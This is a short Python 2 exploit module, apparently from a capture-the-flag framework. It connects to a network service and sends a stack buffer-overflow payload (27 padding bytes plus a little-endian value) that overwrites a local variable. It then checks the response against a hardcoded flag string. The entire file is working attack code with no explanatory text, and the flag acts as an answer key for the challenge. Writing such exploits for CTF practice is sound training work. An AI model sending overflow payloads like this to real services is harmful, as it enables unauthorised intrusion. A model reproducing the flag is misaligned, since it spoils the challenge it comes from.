from ExploitFrame import ExploitFrame
import socket


class Exploit(ExploitFrame):
    def __init__(self, serviceInfo):
        self.name = 'overwriteLocalVar'
        self.output = None
        ExploitFrame.__init__(self, serviceInfo)

    def exploit(self):
        sName = self.serviceInfo.serviceName
        sHost = self.serviceInfo.serviceHost
        sPort = self.serviceInfo.servicePort
        print "Hacking {}!".format(sName)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((sHost, sPort))
        st = 'A' * 27 + '\x1e\xab\x11\xca'
        s.send(st)
        self.output = s.recv(1024)

    def exploitSuccess(self):
        print "Exploit Output: {}".format(self.output)
        if self.output == "Enter the secret word:\nHow did you figure out my secret?!\ngigem{T00_435Y}\n\n":
            return True
        return False
